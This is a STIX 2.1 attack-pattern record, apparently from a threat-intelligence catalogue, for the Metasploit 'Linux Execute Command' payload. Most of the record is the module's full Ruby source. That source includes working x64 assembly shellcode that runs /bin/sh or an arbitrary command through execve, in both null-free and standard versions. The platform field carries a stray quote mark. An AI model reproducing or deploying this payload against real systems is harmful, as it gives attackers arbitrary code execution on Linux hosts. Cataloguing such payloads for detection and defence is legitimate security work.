{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a3c320da-1167-4150-b766-d33c1151b25a",
    "created": "2024-08-14T16:33:19.465173Z",
    "modified": "2024-08-14T16:33:19.465177Z",
    "name": "Linux Execute Command",
    "description": "Execute an arbitrary command or just a /bin/sh shell",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/linux/x64/exec.rb",
            "external_id": "exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nmodule MetasploitModule\n\n  CachedSize = 44\n\n  include Msf::Payload::Single\n  include Msf::Payload::Linux\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Linux Execute Command',\n      'Description'   => 'Execute an arbitrary command or just a /bin/sh shell',\n      'Author'        => ['ricky',\n                          'Geyslan G. Bem <geyslan[at]gmail.com>'],\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'linux',\n      'Arch'          => ARCH_X64))\n\n    register_options(\n      [\n        OptString.new('CMD',  [ false,  \"The command string to execute\" ]),\n      ])\n    register_advanced_options(\n      [\n        OptBool.new('NullFreeVersion', [ true, \"Null-free shellcode version\", false ])\n      ])\n  end\n\n  def generate(opts={})\n    cmd             = datastore['CMD'] || ''\n    nullfreeversion = datastore['NullFreeVersion']\n\n    if cmd.empty?\n      #\n      # Builds the exec payload which executes a /bin/sh shell.\n      # execve(\"/bin/sh\", NULL, NULL)\n      #\n      if nullfreeversion\n        # 22 bytes (null-free)\n        payload = <<-EOS\n            mov rax, 0x68732f6e69622f2f\n            cdq                     ; edx = NULL\n\n            push rdx\n            push rax\n            push rsp\n            pop rdi                 ; \"//bin/sh\"\n\n            push rdx\n            pop rsi                 ; NULL\n\n            push 0x3b\n            pop rax\n\n            syscall                 ; execve(\"//bin/sh\", NULL, NULL)\n        EOS\n\n      else\n        # 21 bytes (not null-free)\n        payload = <<-EOS\n            mov rax, 0x68732f6e69622f\n            cdq                     ; edx = NULL\n\n            push rax\n            push rsp\n            pop rdi                 ; \"/bin/sh\"\n\n            push rdx\n            pop rsi                 ; NULL\n\n            push 0x3b\n            pop rax\n\n            syscall                 ; execve(\"/bin/sh\", NULL, NULL)\n        EOS\n      end\n    else\n      #\n      # Dynamically builds the exec payload based on the user's options.\n      # execve(\"/bin/sh\", [\"/bin/sh\", \"-c\", \"CMD\"], NULL)\n      #\n      pushw_c_opt = \"dd 0x632d6866\" # pushw 0x632d (metasm doesn't support pushw)\n\n      if nullfreeversion\n        if cmd.length > 0xffff\n          raise RangeError, \"CMD length has to be smaller than %d\" % 0xffff, caller()\n        end\n        if cmd.length <= 0xff # 255\n          breg = \"bl\"\n        else\n          breg = \"bx\"\n          if (cmd.length & 0xff) == 0 # let's avoid zeroed bytes\n            cmd += \" \"\n          end\n        end\n        mov_cmd_len_to_breg = \"mov #{breg}, #{cmd.length}\"\n\n        # 48 bytes without cmd (null-free)\n        payload = <<-EOS\n            mov rax, 0x68732f6e69622f2f\n            cdq                     ; edx = NULL\n\n            jmp tocall              ; jmp/call/pop cmd address\n          afterjmp:\n            pop rbp                 ; *CMD*\n\n            push rdx\n            pop rbx\n            #{mov_cmd_len_to_breg}  ; mov (byte/word) (bl/bx), cmd.length\n            mov [rbp + rbx], dl     ; NUL '\\0' terminate cmd\n\n            push rdx\n            #{pushw_c_opt}\n            push rsp\n            pop rsi                 ; \"-c\"\n\n            push rdx\n            push rax\n            push rsp\n            pop rdi                 ; \"//bin/sh\"\n\n            push rdx                ; NULL\n            push rbp                ; *CMD*\n            push rsi                ; \"-c\"\n            push rdi                ; \"//bin/sh\"\n            push rsp\n            pop rsi                 ; [\"//bin/sh\", \"-c\", \"*CMD*\"]\n\n            push 0x3b\n            pop rax\n\n            syscall                 ; execve(\"//bin/sh\", [\"//bin/sh\", \"-c\", \"*CMD*\"], NULL)\n          tocall:\n            call afterjmp\n            db \"#{cmd}\"             ; arbitrary command\n        EOS\n      else\n        # 37 bytes without cmd (not null-free)\n        payload = <<-EOS\n            mov rax, 0x68732f6e69622f\n            cdq                     ; edx = NULL\n\n            push rax\n            push rsp\n            pop rdi                 ; \"/bin/sh\"\n\n            push rdx\n            #{pushw_c_opt}\n            push rsp\n            pop rsi                 ; \"-c\"\n\n            push rdx                ; NULL\n            call continue\n            db \"#{cmd}\", 0x00       ; arbitrary command\n          continue:\n            push rsi                ; \"-c\"\n            push rdi                ; \"/bin/sh\"\n            push rsp\n            pop rsi                 ; [\"/bin/sh\", \"-c\", \"*CMD*\"]\n\n            push 0x3b\n            pop rax\n\n            syscall                 ; execve(\"/bin/sh\", [\"/bin/sh\", \"-c\", \"*CMD*\"], NULL)\n        EOS\n      end\n    end\n    Metasm::Shellcode.assemble(Metasm::X64.new, payload).encode_string\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}